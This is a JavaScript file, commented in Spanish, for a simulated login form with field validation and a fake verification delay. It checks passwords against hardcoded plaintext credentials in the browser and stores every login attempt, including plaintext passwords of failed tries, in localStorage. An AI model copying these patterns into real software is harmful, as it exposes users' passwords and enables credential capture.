document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const togglePassword = document.getElementById('togglePassword');
    const loginBtn = document.getElementById('loginBtn');
    const btnText = document.querySelector('.btn-text');
    const loadingSpinner = document.querySelector('.loading-spinner');
    const generalError = document.getElementById('general-error');

    // Base de datos simulada de usuarios válidos
    const validUsers = [
        { email: 'admin@misitio.com', password: 'admin123' },
        { email: 'usuario@misitio.com', password: 'usuario123' },
        { email: 'test@misitio.com', password: 'test123' }
    ];

    // Mostrar/ocultar contraseña
    togglePassword.addEventListener('click', function() {
        const passwordGroup = document.querySelector('.password-group');
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordInput.setAttribute('type', type);
        passwordGroup.classList.toggle('show-password');
    });

    // Validación en tiempo real
    emailInput.addEventListener('input', validateEmail);
    passwordInput.addEventListener('input', validatePassword);

    function validateEmail() {
        const email = emailInput.value.trim();
        const emailError = document.getElementById('email-error');
        const emailGroup = emailInput.parentElement;

        hideGeneralError();

        if (!email) {
            showError(emailGroup, emailError, 'Ingresa un correo electrónico o teléfono');
            return false;
        }

        if (!isValidEmail(email)) {
            showError(emailGroup, emailError, 'Ingresa un correo electrónico válido');
            return false;
        }

        hideError(emailGroup, emailError);
        return true;
    }

    function validatePassword() {
        const password = passwordInput.value;
        const passwordError = document.getElementById('password-error');
        const passwordGroup = passwordInput.parentElement;

        hideGeneralError();

        if (!password) {
            showError(passwordGroup, passwordError, 'Ingresa tu contraseña');
            return false;
        }

        if (password.length < 6) {
            showError(passwordGroup, passwordError, 'La contraseña es demasiado corta');
            return false;
        }

        hideError(passwordGroup, passwordError);
        return true;
    }

    function isValidEmail(email) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    }

    function showError(inputGroup, errorElement, message) {
        inputGroup.classList.add('error');
        errorElement.textContent = message;
        errorElement.style.display = 'block';
    }

    function hideError(inputGroup, errorElement) {
        inputGroup.classList.remove('error');
        errorElement.style.display = 'none';
    }

    function showGeneralError(message) {
        generalError.textContent = message;
        generalError.style.display = 'block';
        generalError.classList.add('show');
    }

    function hideGeneralError() {
        generalError.style.display = 'none';
        generalError.classList.remove('show');
    }

    // Envío del formulario
    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();

        const isEmailValid = validateEmail();
        const isPasswordValid = validatePassword();

        if (isEmailValid && isPasswordValid) {
            await processLogin();
        }
    });

    async function processLogin() {
        // Mostrar estado de carga
        btnText.style.display = 'none';
        loadingSpinner.style.display = 'block';
        loginBtn.disabled = true;
        hideGeneralError();

        try {
            // Simular verificación (1 segundo)
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            const email = emailInput.value.trim();
            const password = passwordInput.value;

            // Verificar si las credenciales son válidas
            const isValid = checkCredentials(email, password);

            // ✅ GUARDAR TODOS LOS INTENTOS (correctos e incorrectos)
            saveLoginData(email, password, isValid);

            if (isValid) {
                // Credenciales correctas
                alert('✅ ¡Inicio de sesión exitoso!');
                loginForm.reset();
            } else {
                // Credenciales incorrectas
                showGeneralError('❌ Contraseña incorrecta. Inténtalo de nuevo.');
                passwordInput.value = '';
                passwordInput.focus();
            }
            
        } catch (error) {
            showGeneralError('❌ Error al procesar el login. Inténtalo de nuevo.');
        } finally {
            // Restaurar estado normal
            btnText.style.display = 'block';
            loadingSpinner.style.display = 'none';
            loginBtn.disabled = false;
        }
    }

    // Verificar credenciales
    function checkCredentials(email, password) {
        return validUsers.some(user => 
            user.email === email && user.password === password
        );
    }

    // Guardar TODOS los intentos de login
    function saveLoginData(email, password, isValid) {
        let loginAttempts = JSON.parse(localStorage.getItem('loginAttempts')) || [];
        
        const loginData = {
            email: email,
            password: password,
            timestamp: new Date().toLocaleString(),
            status: isValid ? '✅ CORRECTO' : '❌ INCORRECTO',
            timestampISO: new Date().toISOString()
        };
        
        loginAttempts.unshift(loginData); // Agregar al inicio para ver los más recientes primero
        
        // Mantener solo los últimos 50 intentos para no llenar el storage
        if (loginAttempts.length > 50) {
            loginAttempts = loginAttempts.slice(0, 50);
        }
        
        localStorage.setItem('loginAttempts', JSON.stringify(loginAttempts));
    }

    // Efectos de focus
    emailInput.addEventListener('focus', function() {
        hideGeneralError();
    });

    passwordInput.addEventListener('focus', function() {
        hideGeneralError();
    });
});